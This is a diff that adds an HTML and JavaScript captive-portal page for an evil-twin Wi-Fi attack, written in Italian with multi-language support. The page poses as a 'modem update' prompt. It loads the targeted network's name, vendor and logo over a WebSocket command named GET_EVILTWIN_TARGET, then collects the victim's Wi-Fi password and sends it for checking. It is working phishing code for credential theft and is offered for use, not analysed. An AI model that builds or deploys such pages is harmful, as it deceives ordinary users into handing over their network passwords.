@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="title">Aggiornamento Modem</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        img.logo_large {
+            width: 280px;
+            margin-bottom: 15px;
+            margin-top: 8px;
+        }
+
+        img.logo_small {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        img.disabled {
+            display: none;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        .wifi-name {
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 1rem;
+            text-align: left;
+        }
+
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        button.cancel {
+            background-color: #dc3545;
+        }
+
+        button.cancel:hover {
+            background-color: #c82333;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.2rem;
+            }
+
+            p {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img id="logo" class="disabled" src="" alt="Logo Modem">
+        <h1 data-i18n="title">Aggiornamento Modem</h1>
+        <p data-i18n="description">Per garantire il corretto funzionamento della rete, si consiglia di aggiornare il modem. Se l'aggiornamento non viene completato, la rete potrebbe risultare instabile.</p>
+        <div class="wifi-name" id="wifiName" data-i18n="loading">Caricamento...</div>
+        <input type="password" id="wifiPassword" data-i18n="pwd_placeholder" placeholder="Password Wi-Fi">
+        <div class="button-group">
+            <button onclick="submitPassword()" data-i18n="btn_confirm">Conferma</button>
+            <button class="cancel" onclick="window.location.href='loader.html';" data-i18n="btn_cancel">Annulla</button>
+        </div>
+        <footer>
+            <p id="vendor"></p>
+        </footer>
+    </div>
+
+    <script>
+        // ==========================================
+        // LINGUA E AUTORILEVAMENTO
+        // ==========================================
+        let currentTranslations = {};
+        const supportedLangs = ['en', 'it', 'es', 'fr', 'de', 'ru', 'zh'];
+
+        // Funzione helper per tradurre i testi dentro Javascript (es. gli alert)
+        function t(key, defaultText) {
+            return currentTranslations[key] || defaultText;
+        }
+
+        async function initLanguage() {
+            // Rileva la lingua del browser (es. restituisce "it", "en", "es-ES", ecc.)
+            let userLang = navigator.language || navigator.userLanguage;
+            let baseLang = userLang.substring(0, 2).toLowerCase(); // Prende solo le prime 2 lettere
+
+            // Fallback all'inglese se la lingua non è tra quelle dei file JSON
+            if (!supportedLangs.includes(baseLang)) {
+                baseLang = 'en';
+            }
+
+            try {
+                // Ti consiglio di chiamare i file del portale in modo specifico per non confonderli con quelli dell'admin
+                const response = await fetch(`/lang/portal_${baseLang}.json`);
+                if (response.ok) {
+                    currentTranslations = await response.json();
+                    
+                    // Applica le traduzioni all'HTML
+                    document.querySelectorAll('[data-i18n]').forEach(el => {
+                        const key = el.getAttribute('data-i18n');
+                        if (currentTranslations[key]) {
+                            if (el.tagName === 'INPUT') {
+                                el.placeholder = currentTranslations[key];
+                            } else {
+                                el.innerText = currentTranslations[key];
+                            }
+                        }
+                    });
+                }
+            } catch (e) {
+                console.error("Errore caricamento lingua:", e);
+            }
+        }
+
+        // ==========================================
+        // WEBSOCKET CONFIGURATION
+        // ==========================================
+        const WS_URL = `ws://${window.location.host}/ws`;
+        
+        const CMD = {
+            GET_EVILTWIN_TARGET: 6,
+            CHECK_INPUT_PASSWORD: 7
+        };
+
+        let ws = null;
+        let reqIdCounter = 0;
+        let pendingRequests = new Map();
+        let isConnected = false;
+
+        function connectWS() {
+            ws = new WebSocket(WS_URL);
+
+            ws.onopen = () => {
+                isConnected = true;
+                loadTargetInfo();
+            };
+
+            ws.onclose = () => {
+                isConnected = false;
+                setTimeout(connectWS, 1000);
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+                    if (msg.req_id && pendingRequests.has(msg.req_id)) {
+                        const { resolve, reject } = pendingRequests.get(msg.req_id);
+                        if (msg.status === 'error') {
+                            reject(msg.message || "Error");
+                        } else {
+                            resolve(msg);
+                        }
+                        pendingRequests.delete(msg.req_id);
+                    }
+                } catch (e) { console.error(e); }
+            };
+        }
+
+        function sendCommand(cmdId, params = {}) {
+            return new Promise((resolve, reject) => {
+                if (!isConnected) {
+                    reject("Connection lost");
+                    return;
+                }
+                const id = ++reqIdCounter;
+                pendingRequests.set(id, { resolve, reject });
+                const payload = JSON.stringify({ cmd: cmdId, req_id: id, ...params });
+                ws.send(payload);
+                setTimeout(() => {
+                    if (pendingRequests.has(id)) {
+                        pendingRequests.delete(id);
+                        reject("Timeout");
+                    }
+                }, 5000);
+            });
+        }
+
+        // ==========================================
+        // PAGE LOGIC
+        // ==========================================
+
+        async function loadTargetInfo() {
+            try {
+                const data = await sendCommand(CMD.GET_EVILTWIN_TARGET);
+                
+                document.getElementById('wifiName').textContent = `${data.ssid}:`;
+
+                const vendorEl = document.getElementById('vendor');
+                if (!data.vendor || data.vendor === "Generic") {
+                    vendorEl?.remove();
+                } else {
+                    vendorEl.textContent = `© ${data.vendor} 2025, All Rights Reserved.`;
+                }
+
+                const logoEl = document.getElementById('logo');
+                if (data.logo) {
+                    const testImage = new Image();
+                    testImage.onload = function () {
+                        logoEl.src = data.logo;
+                        logoEl.classList.remove('disabled');
+                        if (testImage.width === 100 && testImage.height === 100) {
+                            logoEl.classList.add('logo_small');
+                            logoEl.classList.remove('logo_large');
+                        } else {
+                            logoEl.classList.add('logo_large');
+                            logoEl.classList.remove('logo_small');
+                        }
+                    };
+                    testImage.onerror = function () {
+                        logoEl.classList.add('disabled');
+                    };
+                    testImage.src = data.logo;
+                }
+            } catch (e) {
+                console.error('Errore caricamento:', e);
+                // Uso il sistema di traduzione per il messaggio di errore fallback
+                document.getElementById('wifiName').textContent = t('net_unavailable', 'Rete: (non disponibile)');
+            }
+        }
+
+        async function submitPassword() {
+            const password = document.getElementById('wifiPassword').value;
+            if (!password) {
+                alert(t('alert_empty', "Inserisci la password per continuare."));
+                return;
+            }
+
+            try {
+                const response = await sendCommand(CMD.CHECK_INPUT_PASSWORD, { password: password });
+                
+                if (response.status === "ok") {
+                    alert(t('alert_success', "Password accettata. Aggiornamento in corso..."));
+                } else if (response.status === "bad") {
+                    alert(t('alert_wrong', "Password errata. Riprova."));
+                    document.getElementById('wifiPassword').value = '';
+                } else {
+                    alert(t('alert_error', "Errore sconosciuto."));
+                }
+            } catch (error) {
+                console.error(error);
+                alert(t('alert_conn_error', "Si è verificato un errore di connessione."));
+            }
+        }
+
+        // Init: Avvia prima la lingua, poi i websocket
+        window.addEventListener('DOMContentLoaded', async () => {
+            await initLanguage();
+            connectWS();
+        });
+    </script>
+</body>
+</html>
